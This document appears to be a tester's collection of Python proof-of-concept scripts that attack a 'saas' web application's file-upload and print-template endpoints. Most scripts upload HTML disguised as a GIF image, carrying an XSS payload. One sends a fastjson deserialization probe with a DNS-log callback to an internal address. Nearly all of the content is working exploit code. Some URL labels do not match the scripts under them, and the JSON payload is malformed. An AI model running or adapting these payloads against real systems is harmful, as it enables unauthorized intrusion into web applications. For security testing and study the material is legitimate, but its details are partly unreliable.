http://127.0.0.1:8091/saas/uploadFiles

```python
import requests

# Define the URL
url = "http://127.0.0.1:8091/saas/uploadFiles"

# Define the file path and content
file_path = "test.html"
file_content = "GIF89a\r\n<script>alert('XSS')</script>"

# Write the file content to the file
with open(file_path, "w") as file:
    file.write(file_content)

# Prepare the files and additional form data
files = {
    "mFiles": (file_path, open(file_path, "rb"), "image/gif")
}

# Define additional form data

# Send the POST request
response = requests.post(url, files=files)

# Print the response content
print(response.text)
```

http://127.0.0.1:8091/saas/printtemplate

```python
# 验证文件上传
import requests

# Define the URL
url = "http://127.0.0.1:8091/saas/uploadFilesImage"

# Define the file path and content
file_path = "2_4.html"
file_content = "GIF89a\r\n<script>alert('XSS')</script>"

# Write the file content to the file
with open(file_path, "w") as file:
    file.write(file_content)

# Prepare the files and additional form data
files = {
    "mFiles": (file_path, open(file_path, "rb"), "image/gif")
}

# Define additional form data
data = {
    "imageData": "",
    "version": "37",
}

# Send the POST request
response = requests.post(url, files=files, data=data)

# Print the response content
print(response.text)


```

```python
#验证fastjson

import requests
import json

# URL of the uploadFilesImage endpoint
url = "http://10.0.0.252:8091/saas/uploadFilesImage"

files = {
    'mFiles': ('1.html', open('1.html', 'rb'), 'image/gif'),
}

# Additional form data
data = {
    'imageData': '{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}',
    'version': '37'
}

# Sending POST request
response = requests.post(url, data=data, files=files)

print("1: ", response.text)
print("2: ", response.request.body.decode())
print("3: ", response.request.headers)
```

http://127.0.0.1:8091/saas/uploadFilesImage

```python
import requests

# Define the URL
url = "http://127.0.0.1:8091/saas/printtemplate"

# Define the file path and content
file_path = "test.htm"
file_content = "GIF89a\r\n<script>alert('XSS')</script>"

# Write the file content to the file
with open(file_path, "w") as file:
    file.write(file_content)

# Prepare the files and additional form data
files = {
    "file": (file_path, open(file_path, "rb"), "image/gif")
}

# Define additional form data

# Send the POST request
response = requests.post(url, files=files)

# Print the response content
print(response.text)
```

